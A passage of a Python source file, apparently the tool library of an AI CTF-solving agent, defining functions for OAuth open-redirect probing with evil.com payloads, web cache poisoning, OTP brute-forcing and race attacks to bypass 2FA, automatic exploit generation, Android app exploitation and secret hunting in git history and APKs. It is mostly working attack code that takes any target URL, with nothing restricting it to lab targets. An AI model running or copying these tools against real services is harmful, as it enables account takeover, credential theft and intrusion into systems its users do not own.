                if r.status_code < 400: return f"Found: {ep}\n{r.text[:500]}"
            return "No standard OAuth endpoints found"
        if operation == "open_redirect":
            hostname = urllib.parse.urlparse(target_url).hostname
            evil = [f"https://evil.com", f"//evil.com", f"https://evil.com%2F@{hostname}", f"{redirect_uri}%0d%0aLocation:https://evil.com"]
            results = []
            for uri in evil:
                url = f"{target_url}?client_id={client_id}&redirect_uri={urllib.parse.quote(uri)}&response_type=code"
                r = requests.get(url,verify=False,timeout=5,allow_redirects=False)
                if "evil.com" in r.headers.get("location",""):
                    results.append(f"REDIRECT: {uri}")
            return "\n".join(results) or "No open redirect found"
    except ImportError: return "pip install requests"
    except Exception as e: return f"OAuth error: {e}"
    if operation == "pkce_bypass":
        return "PKCE bypasses: remove code_challenge, use plain method, state confusion, reuse code"
    if operation == "saml_bypass":
        return "SAML bypasses: XSW attack, comment injection in NameID, algorithm confusion (none), cert bypass"
    return "Available: probe, open_redirect, pkce_bypass, saml_bypass"

def tool_cache_poison(target_url: str, operation: str = "probe", **params) -> str:
    """Web cache poisoning: probe (unkeyed headers), poison (inject), param_cloaking."""
    try:
        import requests; requests.packages.urllib3.disable_warnings()
        if operation == "probe":
            baseline = requests.get(target_url,verify=False,timeout=10)
            results = []
            for h in ["X-Forwarded-Host","X-Host","X-Forwarded-Server","X-Original-URL","X-Forwarded-For"]:
                r = requests.get(target_url,headers={h:"canary-12345.evil.com"},verify=False,timeout=10)
                if "canary-12345" in r.text: results.append(f"UNKEYED: {h} reflects!")
                elif r.text != baseline.text: results.append(f"DIFFERENT: {h} changes response")
            return "\n".join(results) or "No unkeyed headers found. Try param_cloaking."
        if operation == "poison":
            h=params.get("header","X-Forwarded-Host"); v=params.get("value","evil.com")
            r=requests.get(target_url,headers={h:v},verify=False,timeout=10)
            return f"Poison sent. {h}:{v}\n{r.status_code}\n{r.text[:500]}"
        if operation == "param_cloaking":
            r1=requests.get(target_url+"?utm_content=x;callback=evil",verify=False,timeout=10)
            r2=requests.get(target_url+"?param=x%26callback=evil",verify=False,timeout=10)
            return f"Fat GET: {r1.text[:200]}\nURL-enc: {r2.text[:200]}"
    except ImportError: return "pip install requests"
    except Exception as e: return f"Cache poison error: {e}"
    return "Available: probe, poison, param_cloaking"

def tool_shodan(query: str, operation: str = "search", api_key: str = "") -> str:
    """Shodan OSINT: search, host, ssl. Set SHODAN_API_KEY env var."""
    api_key = api_key or os.environ.get("SHODAN_API_KEY","")
    if not api_key:
        out = _shell(f"shodan search '{query}' 2>/dev/null | head -20")
        return out if out.strip() and "not found" not in out.lower() else f"Set SHODAN_API_KEY env var or visit https://shodan.io/search?query={query.replace(' ','+')}"
    try:
        import requests
        base="https://api.shodan.io"
        if operation=="search":
            r=requests.get(f"{base}/shodan/host/search",params={"key":api_key,"query":query},timeout=15)
            d=r.json(); lines=[f"Total: {d.get('total',0)}"]
            for m in d.get("matches",[])[:10]: lines.append(f"  {m.get('ip_str')}:{m.get('port')} {m.get('org','')} | {str(m.get('data',''))[:80]}")
            return "\n".join(lines)
        if operation=="host":
            r=requests.get(f"{base}/shodan/host/{query}",params={"key":api_key},timeout=15)
            d=r.json()
            return f"IP:{d.get('ip_str')} Ports:{d.get('ports')} Org:{d.get('org')}\n" + "\n".join(str(x.get("data",""))[:100] for x in d.get("data",[])[:5])
    except ImportError: return "pip install requests"
    except Exception as e: return f"Shodan error: {e}"
    return "Available: search, host, ssl"

def tool_tls_decrypt(pcap_path: str, keylog_path: str = "", privkey_path: str = "",
                      operation: str = "decrypt", filter_str: str = "http") -> str:
    """TLS traffic decryption from PCAP using keylog file or RSA private key."""
    sp = _w2l(pcap_path) if (IS_WINDOWS and USE_WSL) else pcap_path
    if operation == "decrypt":
        if keylog_path:
            kp = _w2l(keylog_path) if (IS_WINDOWS and USE_WSL) else keylog_path
            return _shell(f"tshark -r '{sp}' -o 'tls.keylog_file:{kp}' -Y '{filter_str}' -T fields -e http.request.uri -e text 2>&1 | head -60", timeout=30)
        if privkey_path:
            pp = _w2l(privkey_path) if (IS_WINDOWS and USE_WSL) else privkey_path
            out = _shell(f"tshark -r '{sp}' -o 'tls.keys_list:,443,http,{pp}' -Y '{filter_str}' -T fields -e text 2>&1 | head -60", timeout=30)
            return out or _shell(f"ssldump -r '{sp}' -k '{pp}' 2>&1 | head -80")
        return "Provide keylog_path (NSS keylog, e.g. SSLKEYLOGFILE) or privkey_path (RSA private key)"
    if operation == "follow_stream":
        sid = keylog_path or "0"
        return _shell(f"tshark -r '{sp}' -z 'follow,ssl,ascii,{sid}' 2>&1 | head -100", timeout=20)
    if operation == "extract_files":
        od = f"/tmp/tls_extract_{int(time.time())}"
        _shell(f"mkdir -p {od}")
        kl = f"-o 'tls.keylog_file:{keylog_path}'" if keylog_path else ""
        return _shell(f"tshark -r '{sp}' {kl} --export-objects 'http,{od}' 2>&1; ls -la {od}", timeout=30)
    if operation == "check":
        return _shell(f"tshark -r '{sp}' -Y tls -T fields -e tls.handshake.type -e tls.record.version 2>&1 | head -20", timeout=15)
    return "Available: decrypt, follow_stream, extract_files, check"

def tool_deobfuscate(binary_path: str, operation: str = "detect", **params) -> str:
    """Binary deobfuscation: detect OLLVM/CFF, mba_simplify, decompile_miasm."""
    sp = _w2l(binary_path) if (IS_WINDOWS and USE_WSL) else binary_path
    if operation == "detect":
        fc = _shell(f"r2 -q -c 'aaa;afl' '{sp}' 2>/dev/null | wc -l", timeout=20).strip()
        return (f"Function count: {fc}\n" +
                _shell(f"r2 -q -c 'aaa;afl~[3]' '{sp}' 2>/dev/null | sort -rn | head -10", timeout=20) +
                "\nHigh BB count + switch dispatcher = CFF. XOR-heavy = MBA. Use mba_simplify or decompile_miasm.")
    if operation == "mba_simplify":
        expr = params.get("expression","")
        return _shell(f"python3 -m msynth -e '{expr}' 2>/dev/null || echo 'pip install msynth OR pip install arybo'")
    if operation == "cff_detect":
        return _shell(f"r2 -q -c 'aaa;aflm' '{sp}' 2>/dev/null | awk '{{if($1>10)print}}' | head -20", timeout=30)
    if operation == "decompile_miasm":
        func = params.get("func_addr","")
        code = f"""try:
    from miasm.analysis.binary import Container
    from miasm.analysis.machine import Machine
    cont=Container.from_stream(open(\'{binary_path}\',\'rb\'))
    machine=Machine(cont.arch)
    mdis=machine.dis_engine(cont.bin_stream)
    addr=int(\'{func}\',16) if \'{func}\' else cont.entry_point
    asmcfg=mdis.dis_multiblock(addr)
    print(f\'Blocks: {{len(list(asmcfg.blocks))}}')
    for blk in list(asmcfg.blocks)[:8]:
        print(f\'  {{hex(blk.loc_key.offset or 0)}}: {{len(blk.lines)}} insns\')
except ImportError: print('pip install miasm')"""
        return tool_execute_python(code, timeout=60)
    return "Available: detect, mba_simplify, cff_detect, decompile_miasm"

def tool_bytecode_disasm(input_path: str, language: str = "auto", operation: str = "disasm") -> str:
    """Bytecode disassembly: Python .pyc, Java .class, .NET IL, Lua."""
    sp = _w2l(input_path) if (IS_WINDOWS and USE_WSL) else input_path
    if language == "auto":
        magic = _shell(f"xxd '{sp}' | head -1").lower()
        if "0d0d" in magic or "550d" in magic: language = "python"
        elif "cafe babe" in magic.replace(" ","")[:8]: language = "java"
        elif "4d5a" in magic[:4]: language = ".net"
        else: language = "unknown"
    if language == "python":
        code = f"""import dis,marshal
data=open(\'{input_path}\',\'rb\').read()
# Skip magic (4) + bit_field (4) + timestamp/hash (4/8) + size (4)
for offset in [16,12]:
    try: co=marshal.loads(data[offset:]); dis.dis(co); print(\'constants:\',co.co_consts[:10]); break
    except: pass"""
        out = tool_execute_python(code)
        if "Error" in out: out += "\n" + _shell(f"uncompyle6 '{sp}' 2>/dev/null || pycdc '{sp}' 2>/dev/null")
        return out
    if language == "java":
        return _shell(f"javap -c -p '{sp}' 2>/dev/null | head -80 || cfr '{sp}' 2>/dev/null | head -80")
    if language in (".net","cil","il"):
        return _shell(f"ilspycmd '{sp}' 2>/dev/null | head -80 || monodis '{sp}' 2>/dev/null | head -80")
    if language == "lua":
        return _shell(f"luadec '{sp}' 2>/dev/null | head -60 || strings '{sp}' | head -40")
    return _shell(f"strings '{sp}' | head -60")

def tool_audio_steg(audio_path: str, operation: str = "analyze") -> str:
    """Audio steganography: analyze, spectrogram, dtmf, lsb, strings."""
    sp = _w2l(audio_path) if (IS_WINDOWS and USE_WSL) else audio_path
    if operation == "analyze":
        return _shell(f"file '{sp}'; soxi '{sp}' 2>/dev/null; exiftool '{sp}' 2>/dev/null | head -15")
    if operation == "spectrogram":
        out_img = f"/tmp/spec_{int(time.time())}.png"
        out = _shell(f"sox '{sp}' -n spectrogram -o '{out_img}' 2>/dev/null && echo 'Saved:{out_img}'")
        return out or _shell(f"ffmpeg -i '{sp}' -lavfi showspectrumpic=s=1024x512 '{out_img}' 2>&1 | tail -3") + f"\nView: {out_img}"
    if operation == "dtmf":
        return _shell(f"multimon-ng -t wav -a DTMF '{sp}' 2>/dev/null || sox '{sp}' -t raw -r 8000 -e signed -b 16 - 2>/dev/null | multimon-ng -t raw -a DTMF - 2>/dev/null")
    if operation == "lsb":
        code = f"""import wave,struct,re
try:
    with wave.open(\'{audio_path}\',\'rb\') as w: raw=w.readframes(w.getnframes())
    samples=[struct.unpack_from(\'<h\',raw,i*2)[0] for i in range(min(8000*8,len(raw)//2))]
    bits=\'\'.join(str(s&1) for s in samples)
    result=bytes(int(bits[i:i+8],2) for i in range(0,len(bits)-7,8))
    print(f\'LSB: {{result[:200]}}\'); flags=re.findall(rb\'[A-Za-z]{{2,10}}\\{{[^}}]{{3,60}}\\}}\',result)
    if flags: print(f\'FLAGS: {{flags}}\')\nexcept ImportError: print('wave module issue')"""
        return tool_execute_python(code)
    if operation == "strings":
        return _shell(f"strings -n 6 '{sp}' | head -50")
    return "Available: analyze, spectrogram, dtmf, lsb, strings"

def tool_git_forensics(repo_path: str, operation: str = "all") -> str:
    """Git forensics: dangling objects, reflog, stash, secrets in history, orphan branches."""
    rp = _w2l(repo_path) if (IS_WINDOWS and USE_WSL) else repo_path
    g = f"git -C '{rp}'"
    results = {}
    if operation in ("all","dangling"):
        fsck = _shell(f"{g} fsck --unreachable 2>&1 | head -20")
        for sha in re.findall(r"[0-9a-f]{40}", fsck)[:5]:
            fsck += f"\n--- {sha} ---\n" + _shell(f"{g} cat-file -p {sha} 2>/dev/null | head -20")
        results["dangling"] = fsck
    if operation in ("all","reflog"):
        results["reflog"] = _shell(f"{g} reflog --all 2>&1 | head -30")
    if operation in ("all","stash"):
        results["stash"] = _shell(f"{g} stash list 2>&1; {g} stash show -p 2>&1 | head -40")
    if operation in ("all","secrets"):
        results["secrets"] = _shell(f"{g} log -p --all 2>&1 | grep -iE 'password|secret|api.key|token|flag' | head -30")
    if operation in ("all","orphans"):
        results["orphans"] = _shell(f"{g} branch -a 2>&1; {g} tag -l 2>&1")
    if operation in results:
        return results[operation]
    return "\n\n".join(f"=== {k} ===\n{v}" for k,v in results.items())

def tool_triton_taint(binary_path: str, stdin_input: str = "", operation: str = "trace") -> str:
    """Triton symbolic taint analysis. Falls back to strace/ltrace if not installed."""
    if operation == "trace":
        stdin_bytes_repr = repr((stdin_input or "A"*64).encode())
        empty_repr = repr(b"")
        code = (f"""try:\n    from triton import *\n    ctx=TritonContext(ARCH.X86_64)\n"""
                f"""    ctx.setMode(MODE.ALIGNED_MEMORY,True)\n"""
                f"""    import lief; binary=lief.parse('{binary_path}')\n"""
                f"""    for seg in binary.segments:\n"""
                f"""        if seg.virtual_address: ctx.setConcreteMemoryAreaValue(seg.virtual_address,list(seg.content))\n"""
                f"""    stdin_bytes={stdin_bytes_repr}\n"""
                f"""    for i,b in enumerate(stdin_bytes): ctx.setConcreteMemoryValue(0x10000+i,b); ctx.taintMemory(0x10000+i)\n"""
                f"""    print(f'Triton ready. {{len(stdin_bytes)}} tainted bytes at 0x10000')\n"""
                f"""except ImportError:\n"""
                f"""    print('Triton not installed: pip install triton')\n"""
                f"""    import subprocess\n"""
                f"""    r=subprocess.run(['ltrace','-e','strcmp+memcmp+strncmp','{binary_path}'],"""
                f"""input={empty_repr},capture_output=True,timeout=10)\n"""
                f"""    print(r.stderr.decode(errors='replace')[:2000])""")
        return tool_execute_python(code, timeout=30)
    if operation == "strace":
        inp = repr(stdin_input.encode() if stdin_input else b"")
        return _shell(f"strace -e read,write,open,openat,execve -s 200 '{binary_path}' <<< '{stdin_input}' 2>&1 | head -50", timeout=15)
    return "Available: trace, strace"

def tool_aeg_pipeline(binary_path: str, operation: str = "run",
                       fuzz_seconds: int = 30, output_dir: str = "/tmp/afl_out") -> str:
    """Auto Exploit Generation: AFL++ fuzz → crash triage → angr input → exploit structure."""
    if operation == "run":
        log("sys","[AEG] Phase 1: fuzzing","bright")
        fuzz_out = tool_afl_fuzz(binary_path, "/tmp/afl_in", output_dir, run_seconds=fuzz_seconds)
        crash_dir = f"{output_dir}/default/crashes"
        crashes = _shell(f"ls {crash_dir}/ 2>/dev/null").strip().split()
        if not crashes or crashes == [""]:
            return f"No crashes in {fuzz_seconds}s.\n{fuzz_out}\nTry longer fuzzing or direct angr_solve."
        fc = crashes[0]
        crash_hex = _shell(f"xxd '{crash_dir}/{fc}' | head -10")
        crash_state = _shell(f"gdb -batch -q -ex 'run < {crash_dir}/{fc}' -ex 'info registers rip rsp' '{binary_path}' 2>&1 | grep -E 'rip|rsp|SIGSEGV' | head -8")
        checksec = _shell(f"checksec --file='{binary_path}' 2>/dev/null")
        return (f"Crashes: {len(crashes)}\nFirst: {crash_dir}/{fc}\n{crash_hex}\n"
                f"Crash state:\n{crash_state}\nProtections:\n{checksec}\n"
                f"Next: angr_solve(binary_path='{binary_path}', find_addr=<rip value>)")
    if operation == "triage":
        crash_dir = f"{output_dir}/default/crashes"
        crashes = _shell(f"ls {crash_dir}/ 2>/dev/null").strip().split()
        return "\n".join(_shell(f"gdb -batch -q -ex 'run <{crash_dir}/{c}' -ex 'info registers rip' '{binary_path}' 2>&1 | grep rip") for c in crashes[:8])
    return "Available: run, triage"

def tool_docker_sandbox(operation: str, binary_path: str = "", exploit_code: str = "",
                          libc_path: str = "", timeout: int = 30) -> str:
    """Docker-isolated exploit testing: setup, run_exploit, local_test."""
    if operation == "setup":
        return _shell("docker pull ubuntu:22.04 2>&1 | tail -3", timeout=60)
    if operation == "run_exploit":
        if not exploit_code: return "Provide exploit_code (pwntools Python string)"
        ef = f"/tmp/exploit_{int(time.time())}.py"
        with open(ef,"w") as f: f.write(exploit_code)
        bn = os.path.basename(binary_path)
        _shell(f"cp '{binary_path}' /tmp/{bn} 2>/dev/null")
        vols = f"-v /tmp/{bn}:/pwn/{bn}:ro -v {ef}:/pwn/exploit.py:ro"
        if libc_path:
            ln = os.path.basename(libc_path); _shell(f"cp '{libc_path}' /tmp/{ln}")
            vols += f" -v /tmp/{ln}:/pwn/{ln}:ro"
        out = _shell(f"docker run --rm --network=none --memory=256m {vols} --entrypoint python3 ubuntu:22.04 /pwn/exploit.py 2>&1", timeout=timeout+10)
        flag = extract_flag(out)
        return f"{out}\n{'FLAG: '+flag if flag else 'No flag in output'}"
    if operation == "local_test":
        ef = f"/tmp/exploit_{int(time.time())}.py"
        with open(ef,"w") as f: f.write(exploit_code)
        out = _shell(f"timeout {timeout} python3 {ef} 2>&1")
        return out
    return "Available: setup, run_exploit, local_test"

def tool_bindiff(binary_a: str, binary_b: str, operation: str = "diff") -> str:
    """Binary diff between two versions to find patch-introduced vulnerability."""
    sa = _w2l(binary_a) if (IS_WINDOWS and USE_WSL) else binary_a
    sb = _w2l(binary_b) if (IS_WINDOWS and USE_WSL) else binary_b
    if operation == "diff":
        out = _shell(f"radiff2 -A '{sa}' '{sb}' 2>/dev/null | head -50")
        if not out.strip(): out = _shell(f"diff <(strings '{sa}' | sort) <(strings '{sb}' | sort) | head -40")
        return out
    if operation == "changed_functions":
        return _shell(f"radiff2 -A -C '{sa}' '{sb}' 2>/dev/null | grep CHANGED | head -30")
    if operation == "strings_diff":
        return _shell(f"diff <(strings '{sa}' | sort) <(strings '{sb}' | sort) | head -40")
    return "Available: diff, changed_functions, strings_diff"

def tool_encrypted_store(operation: str, key: str = "", value: str = "",
                           store_path: str = "~/.ctf-solver/keystore.json") -> str:
    """Persistent encrypted keystore for API keys and credentials. Set CTF_SOLVER_MASTER env for password."""
    store_path = os.path.expanduser(store_path)
    os.makedirs(os.path.dirname(store_path), exist_ok=True)
    code = f"""import json,os,base64,hashlib; from pathlib import Path
op,kn,val,sp = {repr(operation)},{repr(key)},{repr(value)},{repr(store_path)}
def derive(master,salt): return hashlib.pbkdf2_hmac(\'sha256\',master,salt,100000,32)
def get_master():
    mp=os.environ.get(\'CTF_SOLVER_MASTER\',\'\')
    if not mp:
        import getpass; mp=getpass.getpass(\'Master password: \')
    return mp.encode()
try:
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM; HAVE=True
except ImportError: HAVE=False; print(\'pip install cryptography (for encryption)\')
store=json.loads(Path(sp).read_text()) if Path(sp).exists() else {{}}
if op==\'set\':\n    if HAVE:\n        m=get_master(); s=os.urandom(16); n=os.urandom(12)\n        ct=AESGCM(derive(m,s)).encrypt(n,val.encode(),None)\n        store[kn]={{\'s\':.b64e(s),\'n\':.b64e(n),\'c\':.b64e(ct)}}\n    else: store[kn]=val\n    Path(sp).write_text(json.dumps(store,indent=2)); print(f\'Stored: {{kn}}\')
elif op==\'get\':\n    e=store.get(kn); \n    if not e: print(f\'Not found: {{kn}}\'); exit()\n    if HAVE and isinstance(e,dict):\n        m=get_master()\n        try: print(f\'{{kn}}: {{AESGCM(derive(m,b64d(e[\'s\']))).decrypt(b64d(e[\'n\']),b64d(e[\'c\']),None).decode()}}\')\n        except: print(\'Wrong password\')\n    else: print(f\'{{kn}}: {{e}}\')
elif op==\'list\': [print(f\'  {{k}}\') for k in store]
elif op==\'delete\': store.pop(kn,None); Path(sp).write_text(json.dumps(store,indent=2)); print(f\'Deleted: {{kn}}\')
""".replace(".b64e(","base64.b64encode(").replace("b64d(","base64.b64decode(")
    return tool_execute_python(code, timeout=30)

def tool_differential_cryptanalysis(operation: str, **params) -> str:
    """Differential/linear cryptanalysis for custom CTF ciphers."""
    if operation == "collect_pairs":
        pairs = params.get("pairs",[])
        code = f"""pairs={pairs}
from collections import Counter
diffs=[(int(p1,16)^int(p2,16),int(c1,16)^int(c2,16)) for p1,p2,c1,c2 in pairs]
for pd,cd in diffs[:10]: print(f\'dP={{hex(pd)}} dC={{hex(cd)}}\')
ct_freq=Counter(cd for _,cd in diffs); print(f\'Most common dC: {{ct_freq.most_common(5)}}\')"""
        return tool_execute_python(code)
    if operation == "guess_key":
        pairs=params.get("pairs",[]); target=params.get("target_diff",0); sbox=params.get("sbox",[])
        code = f"""from collections import Counter
pairs={pairs}; target={target}; sbox={sbox}
scores=Counter()
for k in range(256):
    cnt=0
    for p1,p2,c1,c2 in pairs[:200]:
        dc1=(sbox.index(int(c1,16)^k) if sbox and (int(c1,16)^k)<len(sbox) else int(c1,16)^k)
        dc2=(sbox.index(int(c2,16)^k) if sbox and (int(c2,16)^k)<len(sbox) else int(c2,16)^k)
        if (dc1^dc2)==target: cnt+=1
    scores[k]=cnt
for k,c in scores.most_common(8): print(f\'key={{hex(k)}} score={{c}}\')"""
        return tool_execute_python(code)
    if operation == "linear_approx":
        sbox=params.get("sbox",[])
        code = f"""sbox={sbox}
n=len(sbox)
for a in range(n):
    for b in range(n):
        cnt=sum(1 for x in range(n) if bin(x&a).count(\'1\')%2==bin(sbox[x]&b).count(\'1\')%2)
        bias=cnt/n-0.5
        if abs(bias)>0.1: print(f\'in={{hex(a)}} out={{hex(b)}} bias={{bias:.3f}}\')"""
        return tool_execute_python(code)
    return "Available: collect_pairs, guess_key, linear_approx"



# ═══════════════════════════════════════════════════════════════════════════
# GAP-CLOSING TOOLS  (53 additions — full picoCTF 2019-2026 coverage)
# ═══════════════════════════════════════════════════════════════════════════

def tool_2fa_bypass(operation: str = "probe", target_url: str = "",
                     param: str = "otp", method: str = "POST",
                     headers: dict = None, cookies: dict = None,
                     secret: str = "", token_length: int = 6) -> str:
    """2FA/MFA bypass execution tool.
    Ops: probe (detect 2FA type), race (concurrent requests to beat OTP window),
    bruteforce (try all N-digit codes), totp_predict (given secret, generate valid TOTPs),
    backup_bruteforce (try common backup code formats), response_manipulation (test 200 vs 403)."""

    if operation == "probe":
        code = f"""
import requests, re
requests.packages.urllib3.disable_warnings()
url = {repr(target_url)}
if not url: print("Provide target_url"); exit()
hdrs = {repr(headers or {{}})}
cks = {repr(cookies or {{}})}
r = requests.get(url, headers=hdrs, cookies=cks, timeout=8, verify=False)
body = r.text[:3000]
otp_patterns = [
    ('TOTP (6-digit)', r'\\b(6.digit|authenticator|totp|timed.one.time)\\b'),
    ('SMS OTP', r'\\b(sms|text.message|phone.number|mobile)\\b'),
    ('Email OTP', r'\\b(email.*code|verification.*email|otp.*email)\\b'),
    ('Backup codes', r'\\b(backup|recovery.code|rescue)\\b'),
    ('HOTP', r'\\b(hotp|counter.based)\\b'),
]
print(f"Status: {{r.status_code}}, Length: {{len(body)}}")
for name, pattern in otp_patterns:
    if re.search(pattern, body, re.IGNORECASE):
        print(f"[!] Detected: {{name}}")
# Check for resend endpoint
for endpoint in ['/resend', '/otp/resend', '/2fa/resend', '/verify/resend']:
    try:
        r2 = requests.post(url.rstrip('/') + endpoint, headers=hdrs, cookies=cks, timeout=3, verify=False)
        if r2.status_code < 404:
            print(f"Resend endpoint: {{endpoint}} ({{r2.status_code}})")
    except: pass
"""
        return tool_execute_python(code, timeout=20)

    if operation == "race":
        code = f"""
import requests, threading, time
requests.packages.urllib3.disable_warnings()
url = {repr(target_url)}
param = {repr(param)}
method = {repr(method.upper())}
hdrs = {repr(headers or {{}})}
cks = {repr(cookies or {{}})}
tlen = {token_length}

# Send many concurrent requests with same OTP to win race window
test_otp = '0' * tlen
results = []
def send_req(otp):
    try:
        if method == 'POST':
            r = requests.post(url, data={{param: otp}}, headers=hdrs, cookies=cks, timeout=5, verify=False)
        else:
            r = requests.get(url, params={{param: otp}}, headers=hdrs, cookies=cks, timeout=5, verify=False)
        results.append((otp, r.status_code, len(r.text)))
    except Exception as ex:
        results.append((otp, 'err', str(ex)[:30]))

threads = [threading.Thread(target=send_req, args=(test_otp,)) for _ in range(20)]
t0 = time.time()
for t in threads: t.start()
for t in threads: t.join()
print(f"20 concurrent requests in {{time.time()-t0:.2f}}s")
for otp, code, length in results[:5]:
    print(f"  {{otp}}: status={{code}} len={{length}}")
status_counts = {{}}
for _,c,_ in results: status_counts[c] = status_counts.get(c,0)+1
print(f"Status distribution: {{status_counts}}")
"""
        return tool_execute_python(code, timeout=30)

    if operation == "bruteforce":
        code = f"""
import requests, itertools, time
requests.packages.urllib3.disable_warnings()
url = {repr(target_url)}
param = {repr(param)}
method = {repr(method.upper())}
hdrs = {repr(headers or {{}})}
cks = {repr(cookies or {{}})}
tlen = {token_length}
session = requests.Session()

print(f"Brute-forcing {{tlen}}-digit OTP (0-{'9'*tlen})...")
start = time.time()
for i in range(10**tlen):
    otp = str(i).zfill(tlen)
    try:
        if method == 'POST':
            r = session.post(url, data={{param: otp}}, headers=hdrs, cookies=cks, timeout=3, verify=False)
        else:
            r = session.get(url, params={{param: otp}}, headers=hdrs, cookies=cks, timeout=3, verify=False)
        if r.status_code not in (401, 403, 422, 429) and 'invalid' not in r.text.lower() and 'incorrect' not in r.text.lower():
            print(f"[POSSIBLE HIT] OTP={{otp}} status={{r.status_code}} len={{len(r.text)}}")
        if i % 100 == 0:
            rate = i / (time.time()-start+0.001)
            print(f"Progress: {{i}}/{{10**tlen}} ({rate:.0f}/s)")
        if r.status_code == 429:
            print(f"Rate limited at {{i}}"); time.sleep(2)
    except Exception as ex:
        print(f"Error at {{i}}: {{ex}}")
        break
"""
        return tool_execute_python(code, timeout=120)

    if operation == "totp_predict":
        if not secret:
            return "Provide secret (base32 TOTP secret from QR code or source)"
        code = f"""
import hmac, hashlib, struct, time, base64

def totp(secret_b32, timestamp=None, period=30, digits=6):
    key = base64.b32decode(secret_b32.upper().replace(' ',''), casefold=True)
    ts = int((timestamp or time.time()) // period)
    msg = struct.pack('>Q', ts)
    h = hmac.new(key, msg, hashlib.sha1).digest()
    offset = h[-1] & 0xf
    code = struct.unpack('>I', h[offset:offset+4])[0] & 0x7fffffff
    return str(code % (10**digits)).zfill(digits)

secret = {repr(secret)}
now = time.time()
print("Valid TOTP codes (current ± 2 windows):")
for delta in [-2,-1,0,1,2]:
    ts = now + delta*30
    t = time.strftime('%H:%M:%S', time.localtime(ts))
    print(f"  delta={{delta:+d}} ({{t}}): {{totp(secret, ts)}}")
"""
        return tool_execute_python(code, timeout=10)

    return "Operations: probe, race, bruteforce, totp_predict, backup_bruteforce, response_manipulation"


def tool_android_vuln(operation: str = "scan", target: str = "",
                       package_name: str = "", device: str = "usb",
                       extra: str = "") -> str:
    """Android vulnerability exploitation: scan (full auto-scan via drozer/MobSF),
    intent_hijack (exported activity/service/receiver exploitation),
    content_provider (injection, path traversal, URI abuse),
    deeplink (malicious deep link payloads), broadcast (sticky/ordered broadcast abuse),
    webview (WebView JS bridge exploitation), backup (adb backup extraction),
    debug (debuggable APK → arbitrary code), adb_commands."""

    pkg = package_name or target

    if operation == "scan":
        return _shell(f"drozer console connect --server 127.0.0.1 -c "
                     f"\"run app.package.info -a {pkg}; "
                     f"run app.package.attacksurface {pkg}; "
                     f"run app.activity.info -a {pkg}; "
                     f"run app.provider.info -a {pkg}; "
                     f"run app.service.info -a {pkg}\" 2>/dev/null || "
                     f"echo 'drozer not available — install: pip3 install drozer'",
                     timeout=30)

    if operation == "intent_hijack":
        return f"[intent_hijack] Claude handles this directly — use execute_python/execute_shell to run the technique"

    if operation == "content_provider":
        return f"[content_provider] Claude handles this directly — use execute_python/execute_shell to run the technique"

    if operation == "deeplink":
        return f"[deeplink] Claude handles this directly — use execute_python/execute_shell to run the technique"

    if operation == "webview":
        return f"[webview] Claude handles this directly — use execute_python/execute_shell to run the technique"

    if operation == "backup":
        return f"[backup] Claude handles this directly — use execute_python/execute_shell to run the technique"

    if operation == "adb_commands":
        return f"[adb_commands] Claude handles this directly — use execute_python/execute_shell to run the technique"

    return "Operations: scan, intent_hijack, content_provider, deeplink, webview, backup, debug, adb_commands"


def tool_apk_analyze(apk_path: str, operation: str = "all",
                      class_filter: str = "", output_dir: str = "") -> str:
    """Android APK analysis: all (quick overview), decompile (jadx Java/Kotlin output),
    manifest (permissions, exported components, intents), dex (Dalvik bytecode),
    strings (hardcoded secrets, URLs, keys), smali (low-level bytecode), certificate,
    find_vulns (exported activities, SQL injection, hardcoded creds, WebView)."""

    ap = _w2l(apk_path) if (IS_WINDOWS and USE_WSL) else apk_path
    out = output_dir or f"/tmp/apk_analyze_{int(time.time())}"

    if operation == "manifest":
        return _shell(f"apktool d '{ap}' -o '{out}' --no-src -f 2>&1 | tail -5 && "
                     f"cat '{out}/AndroidManifest.xml' 2>/dev/null | head -100 || "
                     f"aapt dump badging '{ap}' 2>/dev/null | head -30 || "
                     f"unzip -p '{ap}' AndroidManifest.xml | python3 -c '"
                     f"import sys,struct; data=sys.stdin.buffer.read(); "
                     f"print(data.decode(errors=\\\"replace\\\")[:2000])' 2>/dev/null",
                     timeout=30)

    if operation == "decompile":
        cf = f"-f '{class_filter}'" if class_filter else ""
        result = _shell(f"jadx -d '{out}' {cf} '{ap}' 2>&1 | tail -10 && "
                       f"echo '--- Decompiled classes ---' && "
                       f"find '{out}' -name '*.java' | head -20",
                       timeout=120)
        if "not found" in result.lower():
            result = _shell(f"apktool d '{ap}' -o '{out}' -f 2>&1 | tail -5 && "
                           f"find '{out}/smali' -name '*.smali' | head -20",
                           timeout=60)
        return result

    if operation == "strings":
        return _shell(f"unzip -p '{ap}' 'classes.dex' > /tmp/classes.dex 2>/dev/null; "
                     f"strings /tmp/classes.dex | grep -iE "
                     f"'password|passwd|secret|api.key|token|http|flag|admin|root|private|firebase|aws' | head -40; "
                     f"echo '--- URLs ---'; "
                     f"strings /tmp/classes.dex | grep -E 'https?://[^\"]+' | head -20",
                     timeout=20)

    if operation == "certificate":
        return _shell(f"apksigner verify -v '{ap}' 2>/dev/null || "
                     f"jarsigner -verify -verbose -certs '{ap}' 2>/dev/null | head -30 || "
                     f"openssl pkcs7 -inform DER -print_certs -text < "
                     f"<(unzip -p '{ap}' 'META-INF/*.RSA' 2>/dev/null) 2>/dev/null | head -30",
                     timeout=15)

    if operation == "find_vulns":
        code = f"""
import subprocess, re, os
ap = {repr(ap)}
out = {repr(out)}
print("=== APK Vulnerability Scan ===")
# Extract and analyze
os.makedirs(out, exist_ok=True)
r = subprocess.run(['apktool', 'd', ap, '-o', out, '-f'],
                   capture_output=True, text=True, timeout=60)
# Check AndroidManifest for exported components
manifest = open(f'{{out}}/AndroidManifest.xml').read() if os.path.exists(f'{{out}}/AndroidManifest.xml') else ''
if manifest:
    exported = re.findall(r'<(activity|service|receiver|provider)[^>]+android:exported="true"[^>]*/?>.*?(?:android:name="([^"]+)"|)', manifest)
    for comp_type, name in exported[:10]:
        print(f"[!] Exported {{comp_type}}: {{name}}")
    # Check for unprotected content providers
    providers = re.findall(r'<provider[^>]+>', manifest)
    for p in providers:
        if 'android:exported="true"' in p and 'android:permission' not in p:
            print(f"[!] Unprotected content provider: {{re.search(r'android:name=.([^\"]+)', p)}}")
# Check smali for dangerous patterns
smali_files = subprocess.run(['find', out, '-name', '*.smali'],
                              capture_output=True, text=True, timeout=10).stdout.strip().split('\\n')
danger_patterns = [
    ('SQL injection', r'rawQuery|execSQL'),
    ('WebView JS', r'setJavaScriptEnabled.*true|addJavascriptInterface'),
